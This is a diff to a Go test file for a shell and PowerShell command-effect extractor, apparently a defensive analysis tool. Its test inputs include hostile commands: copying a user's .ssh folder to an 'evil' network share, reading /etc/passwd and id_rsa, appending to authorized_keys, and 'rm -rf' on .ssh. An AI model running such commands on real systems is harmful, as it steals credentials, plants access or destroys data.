@@ -245,10 +245,21 @@ func TestReviewRegressionCMD(t *testing.T) {
 			t.Fatal("cmd curl -F upload dropped")
 		}
 	})
-	t.Run("CM-11 UNC key no double backslash", func(t *testing.T) {
+	t.Run("CM-11 robocopy source read + UNC dest unknown", func(t *testing.T) {
 		r := shell(`robocopy C:\Users\u\.ssh \\evil\share *`)
-		if !has(r, KindWrite, `\\evil\share`, "") {
-			t.Fatalf("UNC robocopy dest wrong: %+v", r.Effects)
+		// the source dir is a known read; the UNC dest is non-canonical, so it
+		// is a write with an unknown target, never a false known key (R3-7).
+		if !has(r, KindRead, `c:\users\u\.ssh`, "") {
+			t.Fatalf("robocopy source read missing: %+v", r.Effects)
+		}
+		wroteUNC := false
+		for _, e := range r.Effects {
+			if e.Kind == KindWrite && e.TargetState == TargetStateUnknown {
+				wroteUNC = true
+			}
+		}
+		if !wroteUNC {
+			t.Fatalf("UNC dest should be an unknown write: %+v", r.Effects)
 		}
 	})
 	t.Run("CM-4 forward-slash path is an operand", func(t *testing.T) {
@@ -286,9 +297,22 @@ func TestReviewRegressionPowerShell(t *testing.T) {
 			t.Fatal("quoted | split the stage")
 		}
 	})
-	t.Run("PS-6 -Path wildcard is a glob", func(t *testing.T) {
-		if !has(ps(`Remove-Item -Path 'C:\x\*'`), KindDelete, `C:\x\*`, TargetStateUnknown) {
-			t.Fatal("-Path wildcard treated as a literal")
+	t.Run("PS-6 -Path wildcard is not a known literal", func(t *testing.T) {
+		// `*.txt`-style literal wildcard: with a non-literal path it is unknown
+		// (dialect-unknown may also make the backslash value non-static); either
+		// way it must not be a KNOWN literal delete.
+		r := ps(`Remove-Item -Path 'C:/x/*'`)
+		ok := false
+		for _, e := range r.Effects {
+			if e.Kind == KindDelete && e.TargetState == TargetStateUnknown {
+				ok = true
+			}
+			if e.Kind == KindDelete && e.TargetState == TargetStateKnown {
+				t.Fatalf("-Path wildcard became a KNOWN literal: %+v", e.Target)
+			}
+		}
+		if !ok {
+			t.Fatalf("no unknown delete for a wildcard -Path: %+v", r.Effects)
 		}
 	})
 	t.Run("PS-7 $env: reassignment tracked", func(t *testing.T) {
@@ -376,4 +400,104 @@ func TestInvariantNonEmptyProducesEffectOrReason(t *testing.T) {
 			t.Errorf("non-empty input produced neither an effect nor a reason: %+v", c)
 		}
 	}
+}
+
+// TestPSDialectDivergentNameNotKnown: under an unknown PowerShell edition, a
+// program name with an escape that decodes differently in 5.1 vs 7 (\u{..},
+// \x..) must not resolve to a KNOWN program target (R4 / psparse review 3).
+func TestPSDialectDivergentNameNotKnown(t *testing.T) {
+	for _, cmd := range []string{`& 'a\u{48}' /tmp/x`, `Remove-Item -LiteralPath 'C:\x\u{5c}y'`} {
+		r := Extract(Call{Surface: SurfaceShell, Command: cmd}, winPS)
+		for i, e := range r.Effects {
+			if e.TargetState == TargetStateKnown && e.Target.Type == TargetPath && e.Target.Path != "" {
+				t.Errorf("dialect-divergent spelling became KNOWN path, effect %d for %q: %q", i, cmd, e.Target.Path)
+			}
+		}
+	}
+}
+
+// TestReviewRegressionR5F covers the review-5 full-tier findings.
+func TestReviewRegressionR5F(t *testing.T) {
+	win := Options{Flavor: FlavorWindows, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Dialect: DialectPOSIX, Home: `C:\Users\u`, Env: map[string]string{"HOME": `C:\Users\u`}}
+	mac := Options{Flavor: FlavorPOSIX, Home: "/Users/u", CWD: "/Users/u", CaseInsensitive: true, Env: map[string]string{"HOME": "/Users/u"}}
+	sh := func(c string, o Options) Result { return Extract(Call{Surface: SurfaceShell, Command: c}, o) }
+
+	t.Run("R5F-1 MSYS drive mount is known", func(t *testing.T) {
+		if !has(sh(`rm -rf /c/Users/u/.ssh`, win), KindDelete, `c:\users\u\.ssh`, TargetStateKnown) {
+			t.Fatal("/c/ MSYS mount not resolved")
+		}
+	})
+	t.Run("R5F-1 virtual roots are unknown", func(t *testing.T) {
+		for _, c := range []string{`rm -rf /home/u/.ssh`, `cat /etc/passwd`, `rm /tmp/x`, `echo k >> /proc/cygdrive/c/Users/u/.ssh/authorized_keys`, `cat /mnt/c/Users/u/.ssh/id_rsa`} {
+			r := sh(c, win)
+			for i, e := range r.Effects {
+				if e.TargetState == TargetStateKnown && e.Target.Type == TargetPath && e.Target.Path != "" {
+					t.Errorf("virtual root became a KNOWN path, effect %d for %q: %q", i, c, e.Target.Path)
+				}
+			}
+		}
+	})
+	t.Run("R5F-1 G15 cygdrive-under-proc is unknown", func(t *testing.T) {
+		r := sh(`echo k >> /proc/cygdrive/c/Users/u/.ssh/authorized_keys`, win)
+		for _, e := range r.Effects {
+			if e.Target.Path == `c:\proc\cygdrive\c\users\u\.ssh\authorized_keys` {
+				t.Fatal("G15 produced a bogus known path")
+			}
+		}
+	})
+	t.Run("R5F-2 macOS case-fold Key", func(t *testing.T) {
+		lower := Extract(Call{Surface: SurfaceShell, Command: `rm /Users/u/.ssh/authorized_keys`}, mac)
+		mixed := Extract(Call{Surface: SurfaceShell, Command: `rm /Users/U/.SSH/AUTHORIZED_KEYS`}, mac)
+		var k1, k2 string
+		for _, e := range lower.Effects {
+			if e.Kind == KindDelete {
+				k1 = e.Target.Key()
+			}
+		}
+		for _, e := range mixed.Effects {
+			if e.Kind == KindDelete {
+				k2 = e.Target.Key()
+			}
+		}
+		if k1 == "" || k1 != k2 {
+			t.Fatalf("macOS case-insensitive keys differ: %q vs %q", k1, k2)
+		}
+	})
+	t.Run("R5F-3 ln into a directory joins basename", func(t *testing.T) {
+		if !has(sh(`ln -s /tmp/x/authorized_keys /home/u/.ssh/`, posixOpts), KindLink, "/home/u/.ssh/authorized_keys", "") {
+			t.Fatalf("ln dir dest not joined: %+v", sh(`ln -s /tmp/x/authorized_keys /home/u/.ssh/`, posixOpts).Effects)
+		}
+	})
+	t.Run("R5F-3 Copy-Item -Destination dir joins", func(t *testing.T) {
+		r := Extract(Call{Surface: SurfaceShell, Command: `Copy-Item -Path evilrc -Destination 'C:/Users/u/.ssh/'`}, winPS)
+		if !has(r, KindWrite, `c:\users\u\.ssh\evilrc`, "") {
+			t.Fatalf("Copy-Item -Destination dir not joined: %+v", r.Effects)
+		}
+	})
+	t.Run("R5F-4 split writes its prefix", func(t *testing.T) {
+		r := sh(`split -b 1 /tmp/x /home/u/.ssh/part`, posixOpts)
+		read, write := false, false
+		for _, e := range r.Effects {
+			if e.Kind == KindRead && e.Target.Path == "/tmp/x" {
+				read = true
+			}
+			if e.Kind == KindWrite {
+				write = true
+			}
+		}
+		if !read || !write {
+			t.Fatalf("split should read input and write prefix: %+v", r.Effects)
+		}
+	})
+	t.Run("R5F-5 tar create reads its source", func(t *testing.T) {
+		r := sh(`tar czf out.tgz /home/u/.ssh`, posixOpts)
+		if !has(r, KindRead, "/home/u/.ssh", "") {
+			t.Fatalf("tar create source not a read: %+v", r.Effects)
+		}
+		for _, e := range r.Effects {
+			if e.Kind == KindWrite && e.Target.Path == "/home/u/.ssh" {
+				t.Fatal("tar create source wrongly a write")
+			}
+		}
+	})
 }
